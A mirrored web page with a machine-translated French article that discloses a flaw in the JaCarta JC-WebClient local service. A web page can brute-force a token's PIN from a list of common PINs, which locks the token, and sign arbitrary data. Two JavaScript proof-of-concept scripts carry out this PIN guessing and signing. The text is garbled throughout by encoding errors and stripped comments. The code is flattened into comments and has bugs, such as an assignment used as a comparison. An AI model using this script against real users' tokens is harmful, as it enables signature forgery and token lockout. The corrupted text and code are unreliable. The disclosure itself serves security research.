<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üòó ü§∂üèª ü§ú Tester JaCarta WebClient ou stocker des jetons dans un coffre-fort üê° ü§ûüèº ü§∞</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content=""Quand le couvercle noir a √©t√© emport√© pendant un moment, Margarita s'est retourn√©e et a vu qu'il n'y avait pas seulement des tours multicolores avec ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Tester JaCarta WebClient ou stocker des jetons dans un coffre-fort</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439790/"> <i>"Quand le couvercle noir a √©t√© emport√© pendant un moment, Margarita s'est retourn√©e et a vu qu'il n'y avait pas seulement des tours multicolores avec un avion qui se d√©ployait au-dessus d'eux, mais qu'il n'y avait pas de ville elle-m√™me qui √©tait entr√©e dans le sol et n'avait laiss√© que du brouillard."</i> <i><br><br></i>  <i>M.A.</i>  <i>Boulgakov</i> <i><br></i>  <i>"Ma√Ætre et Marguerite"</i> <br><br>  Bonjour, Habr!  Presque toutes les organisations russes ont probablement ces produits dans une coloration multicolore joyeuse.  Nous parlons de produits et de logiciels JaCarta pour eux.  Un tel bonheur m'est tomb√© aussi, et j'ai d√©cid√© d'√©tendre l√©g√®rement la couverture noire en cachant leur essence, ou API.  Certaines banques, en particulier en √©mettant des tokens JaCarta GOST-2 √† leurs clients, n√©cessitent l'installation de l'application JC-WebClient d'Aladdin R.D. pour fonctionner. <br><br>  Bien qu'il n'y ait pas de nouvelle distribution sur le site officiel du d√©veloppeur (dans la section D√©mo, vous pouvez t√©l√©charger une version plus ancienne, mais elle utilise l'API obsol√®te), la distribution peut √™tre trouv√©e en utilisant Google sur la ligne "JC-WebClient-4.0.0.1186" sur les sites du RB. <br><br>  Apr√®s avoir install√© l'application sur l'ordinateur de l'utilisateur, le port 24738 s'ouvre sur lequel ce client fonctionne. <br><br> <code>https://localhost:24738/JCWebClient.js</code> <br> <br>  Le site Web du d√©veloppeur d√©crit ouvertement et en d√©tail l'API de cette application (ainsi que les fonctions de travail avec le syst√®me de fichiers de toute la ligne de jetons de ce fabricant via jcFS.dll, qui fait partie du package d'installation "JaCarta Single Client") et la conclusion est qu'en utilisant un certain nombre de fonctions, vous pouvez soit signer la signature num√©rique du jeton avec quoi que ce soit, r√©cup√©rer un code PIN ou bloquer le jeton en cas de tentatives infructueuses pour le saisir.  Et tout cela √† distance via Internet. <br><a name="habracut"></a><br>  Ce n'est un secret pour personne que les utilisateurs laissent souvent le code PIN par d√©faut pour le jeton, ou celui avec lequel ils l'ont re√ßu (ils ont g√©n√©ralement peur qu'en changeant le code PIN, tout cesse de fonctionner). <br><br>  Le plus souvent, des codes PIN de type 123456 sont utilis√©s et le jeton est ins√©r√© dans le port de l'ordinateur ou le concentrateur USB pendant la journ√©e de travail, voire 24 heures sur 24. <br><br>  Gr√¢ce √† JC-WebClient, si vous glissez une page Web ou un e-mail avec un simple code JavaScript √† un tel utilisateur, vous pouvez, bien que ne pas obtenir les cl√©s de jeton (dans certains cas, cela n'est possible qu'en acc√©dant directement au syst√®me de fichiers de jeton, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">un exemple a d√©j√† √©t√© donn√©</a> ), mais essayez prenez un code PIN et signez toutes les donn√©es et envoyez-les quelque part. <br><br>  En cas de 10 tentatives d'it√©ration infructueuses, le jeton est bloqu√©, et √† quelle fr√©quence cela se produit, si le code administrateur pour le d√©verrouillage n'est pas d√©fini, alors seule l'initialisation aidera.  Et ce n'est pas pay√© sur les imp√¥ts sur le temps (et en raison des int√©r√™ts et m√™me du blocage du compte fiscal de l'organisation de la taxe), les forfaits des fournisseurs, en g√©n√©ral, le bien ne suffit pas. <br><br><img src="https://habrastorage.org/webt/vr/wy/qe/vrwyqehr02krqg9muflt0rndgqa.jpeg"><br><br>  Le probl√®me d'√©num√©ration du code PIN pourrait √™tre r√©solu soit en permettant de le saisir uniquement via la fen√™tre d'interface JC-WebClient, soit en demi-mesure, par exemple, en cas de 3 tentatives infructueuses pour le saisir, bloquer une autorisation suppl√©mentaire en affichant un message √† l'utilisateur et attendre jusqu'√† ce qu'il confirmera vos actions. <br><br>  J'ai √©crit un petit script de test qui montre cette vuln√©rabilit√©.  Le script fonctionne sur tous les navigateurs modernes et relativement modernes, m√™me IE :) <br><br>  Naturellement, il n'envoie rien, mais affiche simplement les r√©sultats d'une s√©quence de fonctions. <br><br>  Le script impl√©mente une √©num√©ration compl√®te de 10 tentatives pour entrer le code PIN ¬´pour tuer¬ª le jeton, vous pouvez donc ex√©cuter le script uniquement avec un jeton de test! <br><br>  Il convient √©galement de se rappeler que l'utilisation de ce script autrement que sur votre propre jeton de test est une violation de la loi. <br><br>  R√©sultat du test: <br><br><img src="https://habrastorage.org/webt/et/g1/ma/etg1ma5gplp9lsyedbytdzxtcx8.jpeg"><br>  Le script g√©n√®re une paire de cl√©s et un certificat √† l'aide de JC-WebClient pour les tests. <br>  Vous pouvez utiliser EToken PRO Java 72 K, JaCarta GOST, JaCarta GOST-2.  Le jeton doit √™tre pr√©-initialis√© avec le code PIN utilisateur 111111. <br><br>  Avant de commencer les tests, vous devez installer JC-WebClient version 4 ou ult√©rieure. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } var tokenID = slot.id, //   userPin = '111111'; // PIN-  //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('1) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //  PIN- JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: userPin } }); //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('2) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //          var keyPairID = JCWebClient2.createKeyPair({ args: { paramSet: "XA", description: "my description", algorithm: JCWebClient2.Vars.KeyAlgorithm.GOST_2012_256 } }); //     (Distinguished Name (DN)), //    (Common Name, (CN)) var dn = { 'CN': '123', 'C': 'RU' }; //  ,      var exts = { 'keyUsage': 'Digital Signature' }; //   var contID = JCWebClient2.generateUserSelfSignedCertificate({ args: { keyPairID: keyPairID, dn: dn, exts: exts, days: 365 } }); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id      var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  Et en fait, le script d'audit de s√©curit√© lui-m√™me: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } //   var tokenID = slot.id; //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id     var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //    (Hello World  Base64) var dataToSign = 'SGVsbG8sIFdvcmxkIQ=='; document.write("  : "+dataToSign+" "); //   var pin=["1234567890", "123456", "1234567", "12345678", "123456789", "0987654321", "111111", "qwerty", "012345", "0123456", "01234567"]; //  function bind(pass) { JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: pass } }); } var i=0; //     //!  10    !!!!!!!!!! while (i &lt; 10) { i++; try{ bind(pin[i]); tokenState = JCWebClient2.getLoggedInState(); //  ,      if(tokenState.state=1) { document.write("   : "+pin[i]+" "); break; } } //    catch(e){document.write(e+" ");} } //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //   var CertificateBody=JCWebClient2.getCertificateBody({ args: { id: contID } }); document.write("CertificateBody: "+CertificateBody+" "); //  ,        Base64 var signedData = JCWebClient2.signBase64EncodedData({ args: { contID: contID, data: dataToSign, attachedSignature: true } }); document.write(" . "); document.write(" : "+signedData+" "); //  var signature = signedData; var res = JCWebClient2.verifyBase64EncodedData({ args: { signature: signature } }); document.write("  : "+res+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  ‚Üí <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Source d'information de l'API JC-WebClient</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr439790/">https://habr.com/ru/post/fr439790/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr439780/index.html">PHP Digest n ¬∞ 149 (28 janvier - 11 f√©vrier 2019)</a></li>
<li><a href="../fr439782/index.html">CMS sans t√™te - l'avenir de la gestion de contenu</a></li>
<li><a href="../fr439784/index.html">Le moteur Raptor Methane bat le record du RD-180</a></li>
<li><a href="../fr439786/index.html">Examen du t√©l√©phone IP Snom D712 (et un petit D710)</a></li>
<li><a href="../fr439788/index.html">Une autre bizarrerie dans les algorithmes GOST Grasshopper et Stribog</a></li>
<li><a href="../fr439792/index.html">La NASA recherche des partenaires dans l'industrie am√©ricaine pour cr√©er un atterrissage habit√© partiellement r√©utilisable</a></li>
<li><a href="../fr439794/index.html">Douleurs dorsales - comprendre du point de vue de la m√©decine moderne</a></li>
<li><a href="../fr439796/index.html">Spring Boot 2: ce qu'ils n'√©crivent pas dans les notes de version</a></li>
<li><a href="../fr439804/index.html">Zen des tests unitaires</a></li>
<li><a href="../fr439806/index.html">Noms de domaine SSL valides pour les conteneurs Docker locaux</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>